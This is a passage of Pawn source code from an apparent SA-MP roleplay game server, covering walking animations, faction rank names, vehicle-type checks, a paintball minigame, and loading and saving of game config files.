	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_FAT)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_fat",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_fat",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_LADY)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_LADY2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_WHORE)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_WHORE2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_DRUNK)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_drunk",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_drunk",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_BLIND)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","Walk_Wuzi",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","Walk_Wuzi",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	return true;
}

stock Float:GetDistance(Float: x1, Float: y1, Float: z1, Float: x2, Float: y2, Float: z2)
{
	new Float:d;
	d += floatpower(x1-x2, 2.0);
	d += floatpower(y1-y2, 2.0);
	d += floatpower(z1-z2, 2.0);
	d = floatsqroot(d);
	return d;
}

stock Float: GetDistanceToCar(playerid, veh) {

	new
		Float: fVehiclePos[3];

	GetVehiclePos(veh, fVehiclePos[0], fVehiclePos[1], fVehiclePos[2]);
	return GetPlayerDistanceFromPoint(playerid, fVehiclePos[0], fVehiclePos[1], fVehiclePos[2]);
}

stock GetClosestCar(iPlayer, iException = INVALID_VEHICLE_ID, Float: fRange = Float: 0x7F800000) {

	new
		iReturnID = -1,
		Float: fVehiclePos[4];

	for(new i = 1; i <= MAX_VEHICLES; ++i) if(GetVehicleModel(i) && i != iException) {
		GetVehiclePos(i, fVehiclePos[0], fVehiclePos[1], fVehiclePos[2]);
		if((fVehiclePos[3] = GetPlayerDistanceFromPoint(iPlayer, fVehiclePos[0], fVehiclePos[1], fVehiclePos[2])) < fRange) {
			fRange = fVehiclePos[3];
			iReturnID = i;
		}
	}
	return iReturnID;
}

stock GetFactionName(factionid) {
	new
		employer[64];
	switch(factionid) {
		case 1: employer = "LSPD";
		case 2: employer = "FBI";
		case 3: employer = "LSFMD";
		case 4: employer = "Hitman Agency";
		case 5: employer = "Government";
		case 9: employer = "SA News";
	}
	return employer;
}

forward ResyncPlayer(playerid);
public ResyncPlayer(playerid) {
	#define RESYNC_TIME (1000) // MS

	if(GetPVarInt(playerid, "_resync") != 0) {
	    GameTextForPlayer(playerid, "~r~ Resynchronizing...", RESYNC_TIME, 5);
		SetPVarInt(playerid, "_tmpVW", GetPlayerVirtualWorld(playerid));
		SetPVarInt(playerid, "_resync", 1);
		SetPlayerVirtualWorld(playerid, TEMP_RESYNC_VW);
		SetTimerEx("ResyncPlayer", RESYNC_TIME, false, "d", playerid);
	} else {
	    SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "_tmpVW"));
	    DeletePVar(playerid, "_resync");
	    DeletePVar(playerid, "_tmpVW");
	}
	return 1;
}

stock GetPlayerFactionInfo(targetid, rank[64], division[64], employer[64]) { // >>> UPDATE FACTION NAMES FROM GetFactionName <<<
	switch(PlayerInfo[targetid][pFaction]) { // employer/rank/division data is pulled from here
	    case 1: {
            employer = "LSPD";
			switch(PlayerInfo[targetid][pRank]) {
			    case 1: rank = "Officer";
			    case 2: rank = "Corporal";
			    case 3: rank = "Sergeant";
			    case 4: rank = "Lieutenant";
			    case 5: rank = "Captain";
			    case 6: rank = "Chief";
			    default: rank = "Cadet";
			}
			switch(PlayerInfo[targetid][pDivision]) {
			    case 1: division = "None";
			    case 2: division = "DET";
			    case 3: division = "TE";
			    case 4: division = "FTO";
			    case 5: division = "SWAT";
			    case 6: division = "IA";
			    default: division = "None";
			}
		}
  		case 2: {
            employer = "FBI";
			switch(PlayerInfo[targetid][pRank]) {
			    case 1: rank = "Agent";
			    case 2: rank = "Senior Agent";
			    case 3: rank = "Special Agent";
			    case 4: rank = "Supervisory Agent";
			    case 5: rank = "Assistant Director";
			    case 6: rank = "Director";
			    default: rank = "Intern";
			}
			switch(PlayerInfo[targetid][pDivision]) {
			    case 1: division = "None";
			    case 2: division = "GU";
			    case 3: division = "FAN";
			    case 4: division = "CID";
			    case 5: division = "IA";
				case 6: division = "NSB";
			    default: division = "None";
			}
		}
  		case 3: {
            employer = "LSFMD";

			switch(PlayerInfo[targetid][pRank]) {
				case 0: rank = "Probationary";
				case 1: rank = "EMT Intermediate";
				case 2: rank = "EMT Paramedic";
				case 3: rank = "Lieutenant";
				case 4: rank = "Captain";
				case 5: rank = "Deputy Chief";
				case 6: rank = "Chief";
				default: rank = "Volunteer";
			}

			switch(PlayerInfo[targetid][pDivision]) {
			    case 1: division = "T&R";
			    case 2: division = "LF";
				case 3: division = "FD";
			    default: division = "None";
			}
		}
		case 4: {
		    employer = "Hitman Agency";
		    switch(PlayerInfo[targetid][pRank])
		    {
    			case 1: rank = "Freelancer";
				case 2: rank = "Marksman";
				case 3: rank = "Agent";
				case 4: rank = "Special Agent";
				case 5: rank = "Vice Director";
				case 6: rank = "Director";
				default: rank = "Freelancer";
			}
			division = "None";
		}
		case 5: {
		    employer = "Government";
		    switch(PlayerInfo[targetid][pRank]) {
				case 1: {
					if(PlayerInfo[targetid][pDivision] == 5)
						rank = "Intern";
					else
					    rank = "Employee";
				}
				case 2: {
					if(PlayerInfo[targetid][pDivision] == 5)
						rank = "Bodyguard";
					else
					    rank = "Public Advocate";
				}
				case 3: {
					if(PlayerInfo[targetid][pDivision] == 5)
						rank = "Agent";
					else
					    rank = "Secretary";
				}
				case 4: {
					if(PlayerInfo[targetid][pDivision] == 5)
						rank = "Special Agent";
					else
					    rank = "Councilor";
				}
				case 5: {
					if(PlayerInfo[targetid][pDivision] == 5)
						rank = "Head of Security";
					else
					    rank = "Vice Mayor";
				}
				case 6: rank = "Mayor";
				default: rank = "Staff";
			}

			division = "None";
			switch(PlayerInfo[targetid][pDivision]) {
				case 1: division = "None";
			    case 2: division = "Executive";
			    case 3: division = "Judicial";
			    case 4: division = "Legislative";
			    case 5: division = "SS";
			    default: division = "None";
			}
		}
		case 9: {
		    employer = "SA News";
		    switch(PlayerInfo[targetid][pRank]) {
				case 1: rank = "Intern";
				case 2: rank = "Local Journalist";
				case 3: rank = "Local Reporter";
				case 4: rank = "Network Anchor";
				case 5: rank = "Asst. Network Producer";
				case 6: rank = "Network Producer";
				default: rank = "Intern";
			}

			division = "None";
			switch(PlayerInfo[targetid][pDivision]) {
			    case 1: division = "Security";
			    default: division = "";
			}
		}
	    default: { employer = "None"; division = "None"; rank = "None"; }
	}
	return 1;
}

stock IsACopCar(carid)
{
	for(new v = 0; v < sizeof(LSPDVehicles); v++) {
	    if(carid == LSPDVehicles[v]) return 1;
	}
	return 0;
}

stock IsAFBICar(carid)
{
	for(new v = 0; v < sizeof(FBIVehicles); v++) {
	    if(carid == FBIVehicles[v]) return 1;
	}
	return 0;
}

stock IsAnAmbulance(carid)
{
	for(new v = 0; v < sizeof(LSFMDVehicles); v++) {
	    if(carid == LSFMDVehicles[v]) return 1;
	}
	return 0;
}

stock IsANewsVeh(vehid) {
	for(new v = 0; v < sizeof(SANVehicles); v++) {
	    if(vehid == SANVehicles[v]) return 1;
	}
	return 0;
}

/*stock IsAGovCar(carid)
{
	for(new v = 0; v < sizeof(GovVehicles); v++) {
	    if(carid == GovVehicles[v]) return 1;
	}
	return 0;
}*/

stock IsACop(playerid) {
	if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2) return 1;
	else return 0;
}

stock IsInLSFMD(playerid) {
	if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3) return 1;
	else return 0;
}

stock IsAtDeliverPatientPoint(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0,1142.4733,-1326.3633,13.6259) || IsPlayerInRangeOfPoint(playerid, 5.0, 1165.1564,-1368.8240,26.6502) || IsPlayerInRangeOfPoint(playerid, 3.0,2027.0599,-1410.6870,16.9922) || IsPlayerInRangeOfPoint(playerid, 5.0, 2024.5742,-1382.7844,48.3359))
		{//ALLSAINTS, ALL SAINTS ROOF, COUNTY GENERAL, COUNTY ROOF
			return 1;
		}
	}
	return 0;
}

stock IsAtImpoundingPoint(playerid) {
	return (IsPlayerInRangeOfPoint(playerid, 4.0,1602.002197, -1608.801879, 13.662560));
}

stock IsAtArrestPoint(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 4.0, 1528.082397, -1677.978637, 5.890625))
		{// LSPD
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 4.0, 1564.830932, -1652.506469, 28.395606))
		{// LSPD roof
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 4.0, 304.796508, -1526.349731, 76.539062))
		{// FBI roof
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 4.0, 298.313842, -1536.036865, 24.593750))
		{// FBI
			return 1;
		}
		if(PlayerInfo[playerid][pVW] == 20002 || PlayerInfo[playerid][pVW] == 1324123)
		{//LSPD int and FBI int
			return 1;
		}
	}
	return 0;
}

stock JoinPaintballGame(playerid, game) {
	if(game == 0)
	    return 0;
	if(game > 3) {
		new
			Team1Total,
			Team2Total;

		foreach(Player, i) {
			if(GetPVarInt(i, "PBM") == game) {
				if(PaintballTeam[i] == 1) Team1Total ++;
				else if(PaintballTeam[i] == 2) Team2Total ++;
			}
		}

		if(Team1Total > Team2Total) PaintballTeam[playerid] = 2;
		else PaintballTeam[playerid] = 1;
	}

	switch(game) {
	    case 1: { // dm lv warehouse
			SetPlayerPos(playerid, 1059.895996, 2081.685791, 10.820312);
			SetPlayerInterior(playerid, 0); // just for clarity
			SetPlayerVirtualWorld(playerid, 60);

			SetPVarInt(playerid, "PBM", 1);
		}
	    case 2: { // dm random warehouse
			SetPlayerPos(playerid, 1283.287841, 5.694778, 1001.011779);
			SetPlayerInterior(playerid, 18);
			SetPlayerVirtualWorld(playerid, 61);

			SetPVarInt(playerid, "PBM", 2);
	    }
	    case 3: { // dm rc battlefield
			SetPlayerPos(playerid, -975.975708, 1060.983032, 1345.671875);
			SetPlayerInterior(playerid, 10);
			SetPlayerVirtualWorld(playerid, 62);

			SetPVarInt(playerid, "PBM", 3);
		}
	    case 4: { // tdm lv warehouse
			SetPVarInt(playerid, "PBM", 4);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 63);
			if(PaintballTeam[playerid] == 1) {
				SetPlayerPos(playerid, 1068.6324, 2082.7930, 10.8203);
				SetPlayerFacingAngle(playerid, 359.9999);
				SetPlayerColor(playerid, 0xFFFF0000);
				SetPlayerTeam(playerid, 1);
			} else {
				SetPlayerPos(playerid, 1069.3499, 2127.0828, 10.8203);
				SetPlayerFacingAngle(playerid, 181.4610);
				SetPlayerColor(playerid, 0x33CCFF00);
				SetPlayerTeam(playerid, 2);
			}
		}
	    case 5: { // tdm random warehouse
			SetPVarInt(playerid, "PBM", 5);
			SetPlayerInterior(playerid, 18);
			SetPlayerVirtualWorld(playerid, 64);
			if(PaintballTeam[playerid] == 1) {
				SetPlayerPos(playerid, 1305.5143, 3.6555, 1001.0269);
				SetPlayerFacingAngle(playerid, 0);
				SetPlayerColor(playerid, 0xFFFF0000);
				SetPlayerTeam(playerid, 1);
			} else {
				SetPlayerPos(playerid, 1252.7601,-46.6263,1001.0282);
				SetPlayerFacingAngle(playerid, 133.2679);
				SetPlayerColor(playerid, 0x33CCFF00);
				SetPlayerTeam(playerid, 2);
			}
	    }
	    case 6: { // tdm rc battlefield
			SetPVarInt(playerid, "PBM", 6);
			SetPlayerInterior(playerid, 10);
			SetPlayerVirtualWorld(playerid, 65);
			if(PaintballTeam[playerid] == 1) {
				SetPlayerPos(playerid, -1128.8225, 1057.4939, 1346.4141);
				SetPlayerFacingAngle(playerid, 260);
				SetPlayerColor(playerid, 0xFFFF0000);
				SetPlayerTeam(playerid, 1);
			} else {
				SetPlayerPos(playerid, -976.2924, 1061.0496, 1345.6719);
				SetPlayerFacingAngle(playerid, 90);
				SetPlayerColor(playerid, 0x33CCFF00);
				SetPlayerTeam(playerid, 2);
			}
		}
	}

	new
	    szMessage[64],
		iCount;

    format(szMessage, sizeof(szMessage), "%s has joined the paintball game.", GetPlayerNameEx(playerid));
	foreach(Player, i) {
		if(GetPVarInt(i, "PBM") == game && GetPVarInt(i, "PBM") > 0) {
		    SendClientMessage(i, COLOR_RED, szMessage);
		    iCount++;
		}
	}
	ResetPlayerWeapons(playerid);
	SetPlayerHealth(playerid, 100);
	SetPlayerArmourEx(playerid, 0);
    if(gaPaintballGameTimer[game] <= 0 && iCount > 0 && gaPaintballGameTimeRemaining[game] > 0) {
		GivePlayerValidAdminWeapon(playerid, 24, 99999);
		GivePlayerValidAdminWeapon(playerid, 27, 99999);
		GivePlayerValidAdminWeapon(playerid, 29, 99999);
		GivePlayerValidAdminWeapon(playerid, 31, 99999);

		TogglePlayerControllable(playerid, true);

		SendClientMessage(playerid, COLOR_RED, "You've joined after the game has started. You might not win this one!");
    } else {
        if(iCount == 0) {
			SendClientMessage(playerid, COLOR_GREY, "You're the only player in the game right now. You can't play until another player enters.");
			SetPVarInt(playerid, "IsFrozen", 1);
			TogglePlayerControllable(playerid, false);
        } else {
			SendClientMessage(playerid, COLOR_GREY, "The game hasn't started yet, you'll be frozen until it starts.");
			SetPVarInt(playerid, "IsFrozen", 1);
			TogglePlayerControllable(playerid, false);

		    if(gaPaintballTimerHandles[game] == 0) {
		        gaPaintballGameTimer[game] = 5;
				gaPaintballTimerHandles[game] = SetTimerEx("PaintballTimer", 1000, true, "d", game);
			}
        }
	}

	SendClientMessage(playerid, COLOR_GREY, "If for whatever reason you want to quit during the game, please type /exitpaintball.");
	return 1;
}

forward PaintballTimer(game);
public PaintballTimer(game) {
    gaPaintballGameTimer[game]--;

	if(gaPaintballGameTimer[game] <= 0) {
	    foreach(Player, i) {
			if(GetPVarInt(i, "PBM") == game) {
			    GameTextForPlayer(i, "Game begins...~n~~g~NOW!", 2000, 3);
			    DeletePVar(i, "IsFrozen");
				TogglePlayerControllable(i, true);
				SendClientMessage(i, COLOR_RED, "GO!");

				GivePlayerValidAdminWeapon(i, 24, 99999);
				GivePlayerValidAdminWeapon(i, 27, 99999);
				GivePlayerValidAdminWeapon(i, 29, 99999);
				GivePlayerValidAdminWeapon(i, 31, 99999);
			}
		}

        gaPaintballGameTimeRemaining[game] = 5 * 60;
		KillTimer(gaPaintballTimerHandles[game]);
		gaPaintballTimerHandles[game] = 0;
	} else {
		new
	    	szMessage[32];

        format(szMessage, sizeof(szMessage), "Game begins in...~n~~r~%d", gaPaintballGameTimer[game]);
        foreach(Player, i) {
        	if(GetPVarInt(i, "PBM") == game)
				GameTextForPlayer(i, szMessage, 1000, 3);
        }
	}
	return 1;
}

stock IsMDCPermitted(playerid)
{
	if(	PlayerInfo[playerid][pFaction] == 1|| PlayerInfo[playerid][pLeader] == 1 ||
		PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2||
		PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pLeader] == 5||
		PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3)
	{
		return 1;
	}
	return 0;
}

stock IsATowTruck(carid)
{
	if(GetVehicleModel(carid) == 525) { // NB. Barney removed car id 485, 583, 574 due to native GTA bugs.
		return 1;
	}
	return 0;
}

stock IsABike(carid) {
	switch(GetVehicleModel(carid)) {
		case 509, 481, 510, 462, 448, 581, 522, 461, 521, 523, 463, 586, 468, 471: return 1;
	}
	return 0;
}

stock QSort(numbers[], left, right)
{
        new
                pivot = numbers[left],
                l_hold = left,
                r_hold = right;
        while (left < right)
        {
                while ((numbers[right] >= pivot) && (left < right)) right--;
                if (left != right)
                {
                        numbers[left] = numbers[right];
                        left++;
                }
                while ((numbers[left] <= pivot) && (left < right)) left++;
                if (left != right)
                {
                        numbers[right] = numbers[left];
                        right--;
                }
        }
        numbers[left] = pivot;
        pivot = left;
        left = l_hold;
        right = r_hold;
        if (left < pivot) QSort(numbers, left, pivot - 1);
        if (right > pivot) QSort(numbers, pivot + 1, right);
}

stock IsARC(carid)
{
	switch(GetVehicleModel(carid)) {
		case 441, 464, 465, 501, 564: return 1;
	}
	return 0;
}

stock IsABoat(carid) {
	switch(GetVehicleModel(carid)) {
		case 472, 473, 493, 484, 430, 454, 453, 452, 446: return 1;
	}
	return 0;
}

stock IsAPlane(carid)
{
	switch(GetVehicleModel(carid)) {
		case 592, 577, 511, 512, 593, 520, 553, 476, 519, 460, 513, 548, 425, 417, 487, 488, 497, 563, 447, 469: return 1;
	}
	return 0;
}

stock IsAnBus(carid)
{
	if(GetVehicleModel(carid) == 431 || GetVehicleModel(carid) == 437) {
		return 1;
	}
	return 0;
}

stock IsAnTaxi(carid)
{
	if(GetVehicleModel(carid) == 420 || GetVehicleModel(carid) == 438) {
		return 1;
	}
	return 0;
}

stock IsAPizzaCar(carid)
{
	if(GetVehicleModel(carid) == 448) {
		return 1;
	}
	return 0;
}

stock IsATruckerCar(carid)
{
	for(new v = 0; v < sizeof(TruckerVehicles); v++) {
	    if(carid == TruckerVehicles[v]) return 1;
	}
	return 0;
}

stock Float:GetPizzaDistance(houseid)
{
	new Float: pizzaDistance;
	pizzaDistance = GetDistance(-1726.92, 1359.93, 7.19, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]);
    return pizzaDistance;
}

stock Float:IsABoomboxNearby(Float:posX, Float:posY, Float:posZ, playerid)
{
	new Float: boomboxDistance;
	boomboxDistance = GetDistance(posX, posY, posZ, BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ]);
    return boomboxDistance;
}

stock splits(const strsrc[], strdest[][], delimiter)
{
	new i, li;
	new aNum;
	new len;
	while(i <= strlen(strsrc)){
		if(strsrc[i]==delimiter || i==strlen(strsrc)){
			len = strmid(strdest[aNum], strsrc, li, i, 128);
			strdest[aNum][len] = 0;
			li = i+1;
			aNum++;
		}
		i++;
	}
	return 1;
}

stock ini_GetKey(line[])
{
	new keyRes[64];
	keyRes[0] = 0;
	if(strfind(line , "=" , true) == -1) return keyRes;
	strmid(keyRes , line , 0 , strfind(line , "=" , true) , sizeof(keyRes));
	return keyRes;
}

stock Ini_Value(line[])
{
	new valRes[156];
	valRes[0]=0;
	if(strfind(line , "=" , true) == -1) return valRes;
	strmid(valRes , line , strfind(line , "=" , true)+1 , strlen(line) , sizeof(valRes));
	return valRes;
}

stock LoadPoints()
{
	new arrCoords[9][64];
	new strFromFile2[256];
	new File: file = fopen("points.cfg", io_read);
	if(file)
	{
		new idx;
		while (idx < sizeof(Points))
		{
			fread(file, strFromFile2);
			splits(strFromFile2, arrCoords, '|');
			Points[idx][Pointx] = floatstr(arrCoords[0]);
			Points[idx][Pointy] = floatstr(arrCoords[1]);
			Points[idx][Pointz] = floatstr(arrCoords[2]);
			Points[idx][Type] = strval(arrCoords[3]);
			Points[idx][Vulnerable] = strval(arrCoords[4]);
			strmid(Points[idx][Owner], arrCoords[5], 0, strlen(arrCoords[5]), 255);
			strmid(Points[idx][CapperName], arrCoords[6], 0, strlen(arrCoords[6]), 255);
			strmid(Points[idx][Name], arrCoords[7], 0, strlen(arrCoords[7]), 255);
			Points[idx][MatPoint] = strval(arrCoords[8]);
			//printf("%s Type:%d Owner:%s",Points[idx][Name],Points[idx][Type],Points[idx][Owner]);
			Points[idx][CaptureTimerEx2] = -1;
			Points[idx][ClaimerId] = INVALID_PLAYER_ID;
			Points[idx][PointPickupID] = CreatePickup(1239, 23, Points[idx][Pointx], Points[idx][Pointy], Points[idx][Pointz], -1);
			idx++;
		}
		fclose(file);
	}
	return 1;
}

stock UpdatePoints()
{
	new idx;
	new File: file2;
	while (idx < sizeof(Points))
	{
		new coordsstring[256];
		format(coordsstring, sizeof(coordsstring), "%f|%f|%f|%d|%d|%s|%s|%s|%d\n",
		Points[idx][Pointx],
		Points[idx][Pointy],
		Points[idx][Pointz],
		Points[idx][Type],
		Points[idx][Vulnerable],
		Points[idx][Owner],
		Points[idx][CapperName],
		Points[idx][Name],
		Points[idx][MatPoint]);
		if(idx == 0)
		{
			file2 = fopen("points.cfg", io_write);
		}
		else
		{
			file2 = fopen("points.cfg", io_append);
		}
		fwrite(file2, coordsstring);
		idx++;
		fclose(file2);
	}
	return 1;
}

stock ClearFamily(family)
{
	foreach(Player, i) {
		if(PlayerInfo[i][pGang] == family) {
			SendClientMessage(i, COLOR_LIGHTBLUE, "* The Family you're in has just been deleted by an Admin, you have been kicked out automatically.");
			PlayerInfo[i][pGang] = 255;
			PlayerInfo[i][pRank] = 0;
		}
	}

	new string[MAX_PLAYER_NAME];
	format(string, sizeof(string), "None");
	FamilyInfo[family][FamilyTaken] = 0;
	strmid(FamilyInfo[family][FamilyName], string, 0, strlen(string), 255);
	strmid(FamilyInfo[family][FamilyMOTD], string, 0, strlen(string), 255);
	strmid(FamilyInfo[family][FamilyLeader], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Outsider");
	strmid(FamilyInfo[family][FamilyRank1], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Associate");
	strmid(FamilyInfo[family][FamilyRank2], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Soldier");
	strmid(FamilyInfo[family][FamilyRank3], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Capo");
	strmid(FamilyInfo[family][FamilyRank4], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Underboss");
	strmid(FamilyInfo[family][FamilyRank5], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Godfather");
	strmid(FamilyInfo[family][FamilyRank6], string, 0, strlen(string), 255);
	FamilyInfo[family][FamilyColor] = 0;
	FamilyInfo[family][FamilyTurfTokens] = 24;
	FamilyInfo[family][FamilyMembers] = 0;
	FamilyInfo[family][FamilySpawn][0] = 0.0;
	FamilyInfo[family][FamilySpawn][1] = 0.0;
	FamilyInfo[family][FamilySpawn][2] = 0.0;
	FamilyInfo[family][FamilySpawn][3] = 0.0;
    FamilyInfo[family][FamilyGuns][0] = 0;
    FamilyInfo[family][FamilyGuns][2] = 0;
    FamilyInfo[family][FamilyGuns][3] = 0;
    FamilyInfo[family][FamilyGuns][4] = 0;
    FamilyInfo[family][FamilyGuns][5] = 0;
    FamilyInfo[family][FamilyGuns][6] = 0;
    FamilyInfo[family][FamilyGuns][7] = 0;
	FamilyInfo[family][FamilyGuns][8] = 0;
	FamilyInfo[family][FamilyGuns][9] = 0;
	FamilyInfo[family][FamilyCash] = 0;
	FamilyInfo[family][FamilyMats] = 0;
	FamilyInfo[family][FamilyPot] = 0;
	FamilyInfo[family][FamilyCrack] = 0;
	FamilyInfo[family][FamilySafe][0] = 0.0;
	FamilyInfo[family][FamilySafe][1] = 0.0;
	FamilyInfo[family][FamilySafe][2] = 0.0;
	FamilyInfo[family][FamilyUSafe] = 0;
	//if(IsValidDynamicPickup(FamilyInfo[family][FamilyEntrancePickup])) DestroyPickup(FamilyInfo[family][FamilyEntrancePickup]);
	//if(IsValidDynamicPickup(FamilyInfo[family][FamilyExitPickup])) DestroyPickup(FamilyInfo[family][FamilyExitPickup]);
    DestroyPickup(FamilyInfo[family][FamilyEntrancePickup]);
    DestroyPickup(FamilyInfo[family][FamilyExitPickup]);
	DestroyDynamic3DTextLabel(Text3D:FamilyInfo[family][FamilyEntranceText]);
	DestroyDynamic3DTextLabel(Text3D:FamilyInfo[family][FamilyExitText]);
	DestroyPickup(FamilyInfo[family][FamilyPickup]);
	SaveFamilies();
	return 1;
}

stock ClearCrime(playerid)
{
	if(IsPlayerConnected(playerid)) {
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "********");
		strmid(PlayerCrime[playerid][pBplayer], string, 0, strlen(string), 255);
		strmid(PlayerCrime[playerid][pVictim], string, 0, strlen(string), 255);
		strmid(PlayerCrime[playerid][pAccusing], string, 0, strlen(string), 255);
		strmid(PlayerCrime[playerid][pAccusedof], string, 0, strlen(string), 255);
	}
	return 1;
}

stock LoadFamilies() {

	if(!fexist("families.cfg")) return 1;

	new
		szFileStr[512],
		iIndex,
		File: iFileHandle = fopen("families.cfg", io_read);

	while (iIndex < sizeof(FamilyInfo) && fread(iFileHandle, szFileStr)) {

		sscanf(szFileStr, "p<|>is[42]s[65]s[24]iiifffiiis[20]s[20]s[20]s[20]s[20]s[20]iiiiiiiiiiiiiiiiiiiiii",
			FamilyInfo[iIndex][FamilyTaken],
			FamilyInfo[iIndex][FamilyName],
			FamilyInfo[iIndex][FamilyMOTD],
			FamilyInfo[iIndex][FamilyLeader],
			FamilyInfo[iIndex][FamilyBank],
			FamilyInfo[iIndex][FamilyCash],
			FamilyInfo[iIndex][FamilyUSafe],
			FamilyInfo[iIndex][FamilySafe][0],
			FamilyInfo[iIndex][FamilySafe][1],
			FamilyInfo[iIndex][FamilySafe][2],
			FamilyInfo[iIndex][FamilyPot],
			FamilyInfo[iIndex][FamilyCrack],
			FamilyInfo[iIndex][FamilyMats],
			FamilyInfo[iIndex][FamilyRank1],
			FamilyInfo[iIndex][FamilyRank2],
			FamilyInfo[iIndex][FamilyRank3],
			FamilyInfo[iIndex][FamilyRank4],
			FamilyInfo[iIndex][FamilyRank5],
			FamilyInfo[iIndex][FamilyRank6],
			FamilyInfo[iIndex][FamilyMembers],
			FamilyInfo[iIndex][FamilyMaxSkins],
			FamilyInfo[iIndex][FamilySkins][0],
			FamilyInfo[iIndex][FamilySkins][1],
			FamilyInfo[iIndex][FamilySkins][2],
			FamilyInfo[iIndex][FamilySkins][3],
			FamilyInfo[iIndex][FamilySkins][4],
			FamilyInfo[iIndex][FamilySkins][5],
			FamilyInfo[iIndex][FamilySkins][6],
			FamilyInfo[iIndex][FamilySkins][7],
			FamilyInfo[iIndex][FamilyColor],
			FamilyInfo[iIndex][FamilyTurfTokens],
			FamilyInfo[iIndex][FamilyGuns][0],
			FamilyInfo[iIndex][FamilyGuns][1],
